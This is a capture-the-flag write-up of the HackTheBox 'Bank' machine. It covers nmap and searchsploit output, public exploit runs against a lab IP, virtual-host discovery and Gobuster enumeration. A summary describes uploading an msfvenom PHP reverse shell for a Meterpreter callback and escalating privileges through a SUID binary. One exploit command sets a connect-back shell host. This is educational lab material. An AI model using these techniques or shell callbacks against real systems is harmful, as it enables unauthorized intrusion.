# References
1. [Bank Writeup (mrsaighnal.github.io)](https://mrsaighnal.github.io/2019-04-26-bank-walkthrough/)
2. [Bank Writeup (medium.com)](https://medium.com/@johnsonmatt/hackthebox-bank-walkthrough-8b637ec6a0df)
3. [Bank Writeup (infosecinstitute.com)](https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-bank/)

# Summary
### 1. NMAP
We find out this is a Linux machine, with 3 ports opened. SSH at Port 22, most probably DNS at Port 53, and HTTP at Port 80.

### 2. Enumeration
Visiting `http://10.10.10.29:80` on our browser, we go to Apache2 Ubuntu Default Page. We also see some potential attacks when performing a searchsploit for `apache 2.4.7` & `openssh 6.6.1`.

### 3. Attacking Port 80 Apache 2.4.7
Trying these exploits such as `Remote Code Execution + Scanner` & `JSP Upload Bypass / Remote Code Execution (2)` did not work, and we had to find another way in.

### 4. Attacking Port 22 OpenSSH 6.6.1p1
We tried `Username Enumeration` exploits, but too did not work.

### 5. Further Enumeration with Dirbuster
Intially, when performing both Gobuster & Dirbuster enumerations, not much directories were found. Primarily, they were `/`, `/icons/`, `/icons/small/` and `/server-status/`. After reading writeups, I realised we had to change a small config file.

### 6. Host Configuration
As it turns out, there is something called "Virtual Hosts" in Apache, allowing for multiple domain names to be hosted on a single server. Using the right domain name would allow us to connect to the web application.

Hence, we added the IP & domain `bank.htb` into our `/etc/hosts` file. Afterwards, when browsing to "bank.htb", we were presented with a login page.

### 7. Further Enumeration with Dirbuster Again
Doing a Gobuster enumeration this time, we get far more directories. Of them, we see two interesting directories, `bank.htb/uploads/` and `bank.htb/balance-transfer`. Though we are forbidden to access `/uploads/`, we could access `/balance-transfer`, showing us many files with encrypted information of a bank account holder. 

NOTE: There is an alternative method, bypassing balance-transfer altogether and utilizing a redirect flaw, gaining access to the support page.

### 8. Exploitating Unencrypted Credentials
As it turns out, there is a smaller unencrypted file amongst all the other encrypted information of a bank account holder. Through the failed encryption, we have plaintext access to his credentials to his bank account. We were able to log in to `http://bank.htb/login.php` with these credentials.

### 9. PHP Payload
Since there is a Support page where we could upload a payload, we took a look at the source page and see that the developer had forgotten to remove a comment. Because of this human-error, we could run a PHP reverse shell. 

We used msfvenom to craft a PHP reverse shell and attempted to upload it through the Support page, but got an error. Reading the Developer comments once again, it seems that we had to wrap this PHP reverse shell with a `.htb` suffix instead. We recraft the payload using msfvenom once again, and was able to successfully upload it this time.

Starting a Meterpreter listener, we execute this payload by navigating to `http://bank.htb/uploads/shell.htb`, and we got a Meterpreter reverse shell.

### 10. Privilege Escalation & Getting Flags
Through navigating around, we got our first user flag. To get root flag, we try `getsystem` and `post/multi/recon/local_exploit_suggester` but both did not work. Googling for Linux Privilege Escalation, we see a solution we could attempt, where we check for SUID configurations.

Doing `find / -perm -u=s -type f 2>/dev/null`, we see a file that did not belong there, `/var/htb/bin/emergency`. Upon analyzing the file, we see that the hard work has already been done, this file can get root privileges. Executing this file, we get root access and also the system flag.

# Attack
## 1. NMAP
This machine sounds fun. Let's go.
```
hippoeug@kali:~$ nmap --script vuln 10.129.29.200 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 20:52 +08
...
Scanning 10.129.29.200 [1000 ports]
Discovered open port 22/tcp on 10.129.29.200
Discovered open port 53/tcp on 10.129.29.200
Discovered open port 80/tcp on 10.129.29.200
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:6.6.1p1: 
|       CVE-2015-5600   8.5     https://vulners.com/cve/CVE-2015-5600
|       CVE-2015-6564   6.9     https://vulners.com/cve/CVE-2015-6564
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2015-5352   4.3     https://vulners.com/cve/CVE-2015-5352
|_      CVE-2015-6563   1.9     https://vulners.com/cve/CVE-2015-6563
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| vulners: 
|   cpe:/a:isc:bind:9.9.5-3ubuntu0.14: 
|       PACKETSTORM:138960      7.8     https://vulners.com/packetstorm/PACKETSTORM:138960      *EXPLOIT*
|       PACKETSTORM:132926      7.8     https://vulners.com/packetstorm/PACKETSTORM:132926      *EXPLOIT*
|       MSF:AUXILIARY/DOS/DNS/BIND_TSIG 7.8     https://vulners.com/metasploit/MSF:AUXILIARY/DOS/DNS/BIND_TSIG  *EXPLOIT*
|       MSF:AUXILIARY/DOS/DNS/BIND_TKEY 7.8     https://vulners.com/metasploit/MSF:AUXILIARY/DOS/DNS/BIND_TKEY  *EXPLOIT*
|       EXPLOITPACK:BE4F638B632EA0754155A27ECC4B3D3F    7.8     https://vulners.com/exploitpack/EXPLOITPACK:BE4F638B632EA0754155A27ECC4B3D3F    *EXPLOIT*
|       EXPLOITPACK:46DEBFAC850194C04C54F93E0DFF5F4F    7.8     https://vulners.com/exploitpack/EXPLOITPACK:46DEBFAC850194C04C54F93E0DFF5F4F    *EXPLOIT*
|       EXPLOITPACK:09762DB0197BBAAAB6FC79F24F0D2A74    7.8     https://vulners.com/exploitpack/EXPLOITPACK:09762DB0197BBAAAB6FC79F24F0D2A74    *EXPLOIT*
|       EDB-ID:40453    7.8     https://vulners.com/exploitdb/EDB-ID:40453      *EXPLOIT*
|       EDB-ID:37723    7.8     https://vulners.com/exploitdb/EDB-ID:37723      *EXPLOIT*
|       EDB-ID:37721    7.8     https://vulners.com/exploitdb/EDB-ID:37721      *EXPLOIT*
|       CVE-2016-2776   7.8     https://vulners.com/cve/CVE-2016-2776
|       CVE-2015-5722   7.8     https://vulners.com/cve/CVE-2015-5722
|       CVE-2015-5477   7.8     https://vulners.com/cve/CVE-2015-5477
|       1337DAY-ID-25325        7.8     https://vulners.com/zdt/1337DAY-ID-25325        *EXPLOIT*
|       1337DAY-ID-23970        7.8     https://vulners.com/zdt/1337DAY-ID-23970        *EXPLOIT*
|       1337DAY-ID-23960        7.8     https://vulners.com/zdt/1337DAY-ID-23960        *EXPLOIT*
|       1337DAY-ID-23948        7.8     https://vulners.com/zdt/1337DAY-ID-23948        *EXPLOIT*
|       EXPLOITPACK:D6DDF5E24DE171DAAD71FD95FC1B67F2    7.2     https://vulners.com/exploitpack/EXPLOITPACK:D6DDF5E24DE171DAAD71FD95FC1B67F2    *EXPLOIT*
|       CVE-2017-3141   7.2     https://vulners.com/cve/CVE-2017-3141
|       CVE-2015-5986   7.1     https://vulners.com/cve/CVE-2015-5986
|       CVE-2020-8625   6.8     https://vulners.com/cve/CVE-2020-8625
|       PACKETSTORM:157836      5.0     https://vulners.com/packetstorm/PACKETSTORM:157836      *EXPLOIT*
|       EDB-ID:48521    5.0     https://vulners.com/exploitdb/EDB-ID:48521      *EXPLOIT*
|       CVE-2020-8617   5.0     https://vulners.com/cve/CVE-2020-8617
|       CVE-2020-8616   5.0     https://vulners.com/cve/CVE-2020-8616
|       CVE-2018-5740   5.0     https://vulners.com/cve/CVE-2018-5740
|       CVE-2017-3145   5.0     https://vulners.com/cve/CVE-2017-3145
|       CVE-2016-9131   5.0     https://vulners.com/cve/CVE-2016-9131
|       CVE-2016-8864   5.0     https://vulners.com/cve/CVE-2016-8864
|       1337DAY-ID-34485        5.0     https://vulners.com/zdt/1337DAY-ID-34485        *EXPLOIT*
|       CVE-2019-6465   4.3     https://vulners.com/cve/CVE-2019-6465
|       CVE-2018-5743   4.3     https://vulners.com/cve/CVE-2018-5743
|       CVE-2017-3143   4.3     https://vulners.com/cve/CVE-2017-3143
|       CVE-2017-3142   4.3     https://vulners.com/cve/CVE-2017-3142
|       CVE-2017-3136   4.3     https://vulners.com/cve/CVE-2017-3136
|       CVE-2016-2775   4.3     https://vulners.com/cve/CVE-2016-2775
|       CVE-2020-8622   4.0     https://vulners.com/cve/CVE-2020-8622
|       CVE-2016-6170   4.0     https://vulners.com/cve/CVE-2016-6170
|       CVE-2018-5745   3.5     https://vulners.com/cve/CVE-2018-5745
|       PACKETSTORM:142800      0.0     https://vulners.com/packetstorm/PACKETSTORM:142800      *EXPLOIT*
|       EDB-ID:42121    0.0     https://vulners.com/exploitdb/EDB-ID:42121      *EXPLOIT*
|_      1337DAY-ID-27896        0.0     https://vulners.com/zdt/1337DAY-ID-27896        *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.7: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       PACKETSTORM:127546      6.8     https://vulners.com/packetstorm/PACKETSTORM:127546      *EXPLOIT*
|       EDB-ID:34133    6.8     https://vulners.com/exploitdb/EDB-ID:34133      *EXPLOIT*
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
|       1337DAY-ID-22451        6.8     https://vulners.com/zdt/1337DAY-ID-22451        *EXPLOIT*
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       EDB-ID:47689    5.8     https://vulners.com/exploitdb/EDB-ID:47689      *EXPLOIT*
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       SSV:61874       5.0     https://vulners.com/seebug/SSV:61874    *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED   *EXPLOIT*
|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183
|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228
|       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT*
|       SSV:87152       4.3     https://vulners.com/seebug/SSV:87152    *EXPLOIT*
|       PACKETSTORM:127563      4.3     https://vulners.com/packetstorm/PACKETSTORM:127563      *EXPLOIT*
|       EDB-ID:47688    4.3     https://vulners.com/exploitdb/EDB-ID:47688      *EXPLOIT*
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|       PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT*
|       EDB-ID:42745    0.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
|       EDB-ID:40961    0.0     https://vulners.com/exploitdb/EDB-ID:40961      *EXPLOIT*
|       1337DAY-ID-601  0.0     https://vulners.com/zdt/1337DAY-ID-601  *EXPLOIT*
|       1337DAY-ID-2237 0.0     https://vulners.com/zdt/1337DAY-ID-2237 *EXPLOIT*
|       1337DAY-ID-1415 0.0     https://vulners.com/zdt/1337DAY-ID-1415 *EXPLOIT*
|_      1337DAY-ID-1161 0.0     https://vulners.com/zdt/1337DAY-ID-1161 *EXPLOIT*
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
Ooh, a Linux machine. SSH, mystery port, and HTTP!

## 2. Enumeration
Let's visit the webpage. Navigating to `http://10.10.10.29:80` on our browser, we see the Apache2 Ubuntu Default Page.

![UbuntuDefaultPage](https://user-images.githubusercontent.com/21957042/113509933-b1721000-958a-11eb-9e47-f2fe3d0a4526.png)

Time to find exploits! Let's see `apache 2.4.7` first.
```
hippoeug@kali:~$ searchsploit apache 2.4.7
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                     | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                   | php/remote/29316.py
Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memory Code Execution                                                     | php/remote/40142.php
Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                                        | linux/dos/34133.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                    | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                 | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                          | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                          | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                 | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                   | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                 | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                           | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                        | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                        | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                        | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                    | linux/remote/34.pl
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Many exploits, let's KIV and try some.

While we're at it, let's look at `openssh 6.6.1` as well.
```
hippoeug@kali:~$ searchsploit openssh 6.6.1
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                            | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                      | linux/remote/45210.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                            | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                | linux/remote/45939.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

hippoeug@kali:~$ searchsploit 2ubuntu
Exploits: No Results
Shellcodes: No Results
```
Interesting, couple exploits to KIV too.

## 3. Attacking Port 80 Apache 2.4.7
Googling for "apache 2.4.7 exploit", we don't see anything obvious that we could try. This is unusual, when compared to the previous exercises we have done so far.

Regardless, we will try a few from the Searchsploit searches. Let's try the `Remote Code Execution + Scanner` for `Apache + PHP`, even though we may not have PHP.
```
hippoeug@kali:~$ searchsploit -m 29316.py
  Exploit: Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner
      URL: https://www.exploit-db.com/exploits/29316
     Path: /usr/share/exploitdb/exploits/php/remote/29316.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/hippoeug/29316.py

hippoeug@kali:~$ python 29316.py
--==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--
usage: 

  ./ap-unlock-v1337.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]
  ./ap-unlock-v1337.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]

0pt1ons:

  -h wh1t3h4tz.0rg     | t3st s1ngle h0st f0r vu1n
  -p 80                | t4rg3t p0rt (d3fau1t: 80)
  -S                   | c0nn3ct thr0ugh ss1
  -c 'uname -a;id'     | s3nd c0mm4nds t0 h0st
  -x 192.168.0.2:1337  | c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll
  -s                   | t3st s1ngl3 h0st f0r vu1n
  -r 133.1.3-7.7-37    | sc4nz iP addr3ss r4ng3 f0r vu1n
  -R 1337              | sc4nz num r4nd0m h0st5 f0r vu1n
  -t 2                 | c0nn3ct t1me0ut in s3x (d3fau1t: 3)
  -T 2                 | r3ad t1me0ut in s3x (d3fau1t: 3)
  -f vu1n.lst          | wr1t3 vu1n h0sts t0 f1l3
  -i sc4nz.lst         | sc4nz h0sts fr0m f1le f0r vu1n
  -v                   | pr1nt m0ah 1nf0z wh1l3 sh1tt1ng
hippoeug@kali:~$ python 29316.py -h 10.129.29.200 -s -x 10.10.x.x:4444
--==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--
[+] sc4nn1ng s1ngl3 h0st 10.129.29.200 
[+] h0p3 1t h3lp3d
```
This weird thing didn't h3lp3d at all, was d1ss4p01n+ing..

Let's give another one a shot, this time `JSP Upload Bypass / Remote Code Execution (2)` for `Apache Tomcat`, even though we may not have Tomcat.
```
hippoeug@kali:~$ searchsploit -m 42966.py
  Exploit: Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)
      URL: https://www.exploit-db.com/exploits/42966
     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/hippoeug/42966.py

hippoeug@kali:~$ python 42966.py

                                                                                                                                                                      
                                                                                                                                                                      
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______                                                                                            
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |                                                                                           
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /                                                                                            
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /                                                                                             
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /                                                                                              
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/                                                                                               
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
./cve-2017-12617.py [options]                                                                                                                                         
                                                                                                                                                                      
options:                                                                                                                                                              
                                                                                                                                                                      
-u ,--url [::] check target url if it's vulnerable                                                                                                                    
-p,--pwn  [::] generate webshell and upload it                                                                                                                        
-l,--list [::] hosts list                                                                                                                                             
                                                                                                                                                                      
[+]usage:                                                                                                                                                             
                                                                                                                                                                      
./cve-2017-12617.py -u http://127.0.0.1                                                                                                                               
./cve-2017-12617.py --url http://127.0.0.1                                                                                                                            
./cve-2017-12617.py -u http://127.0.0.1 -p pwn                                                                                                                        
./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn                                                                                                                   
./cve-2017-12617.py -l hotsts.txt                                                                                                                                     
./cve-2017-12617.py --list hosts.txt                                                                                                                                  
                                                                                                                                                                      
                                                                                                                                                                      
[@intx0x80]

hippoeug@kali:~$ python 42966.py -u http://10.129.29.200

                                                                                                                                                                      
                                                                                                                                                                      
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______                                                                                            
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |                                                                                           
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /                                                                                            
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /                                                                                             
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /                                                                                              
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/                                                                                               
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
[@intx0x80]                                                                                                                                                           
                                                                                                                                                                      
                                                                                                                                                                      
Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617 
```
Nope, not vulnerable. Let's move on to find another way in.

## 4. Attacking Port 22 OpenSSH 6.6.1p1
Googling for "openssh 6.6.1 exploit", we don't see anything obvious that we could either.

Hence let's just get our hands dirty. We will try both `Username Enumeration` exploits.
```
hippoeug@kali:~$ python 45233.py
/home/hippoeug/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
Traceback (most recent call last):
  File "45233.py", line 30, in <module>
    old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
TypeError: 'property' object has no attribute '__getitem__'

hippoeug@kali:~$ python 45210.py
/home/hippoeug/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
Traceback (most recent call last):
  File "45210.py", line 40, in <module>
    paramiko.common.MSG_SERVICE_ACCEPT]
TypeError: 'property' object has no attribute '__getitem__'
```
Both of them showed errors. 

Since none of these exploits worked so far, we shall do Dirbuster!

## 5. Further Enumeration with Dirbuster
As we've done so in the [Beep](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Beep.md) exercise, we will use Gobuster and Dirbuster.

Gobuster first, as with tradition.
```
hippoeug@kali:~$ gobuster dir -u "http://10.129.41.103:80" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.41.103:80
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/31 04:27:05 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2021/01/31 04:36:53 Finished
===============================================================
```
What the.. only 1 directory detected.

Let's now use Dirbuster.
```
hippoeug@kali:~$ dirbuster
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /icons/ - 403
Dir found: /icons/small/ - 403
Dir found: /server-status/ - 403
DirBuster Stopped
```
What is going on!! I needed to look online for clues.

After reading some walkthroughs, there was something that needed to be done. We had to add the domain into our `/etc/hosts` file.

## 6. Host Configuration
It turns out there is something called ["Virtual Hosts"](https://www.freeparking.co.nz/learning-hub/wiki/what-is-virtual-hosting) in Apache, allowing for multiple domain names to be hosted on a single server. Using the right domain name would allow us to connect to the web application.

Let's configure our `/etc/hosts` file.
```
hippoeug@kali:~$ sudo nano /etc/hosts
hippoeug@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.41.103 bank.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
After adding this, we open our browser to "bank.htb" and get directed to "bank.htb/login.php", presenting a login page this time around.

![BankLogin](https://user-images.githubusercontent.com/21957042/113509926-ae771f80-958a-11eb-8d23-ebc14970e483.png)

## 7. Further Enumeration with Dirbuster Again
Let's run GoBuster first.
```
hippoeug@kali:~$ gobuster dir -u "http://bank.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://bank.htb
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/31 15:10:21 Starting gobuster
===============================================================
/uploads (Status: 301)
/assets (Status: 301)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/article: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/links: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/spacer: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/02: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/privacy: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/11: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/help: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/articles: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/events: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/logo: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/new: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
...
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/misc: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/24: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/19: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/partners: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/2007: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/26: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
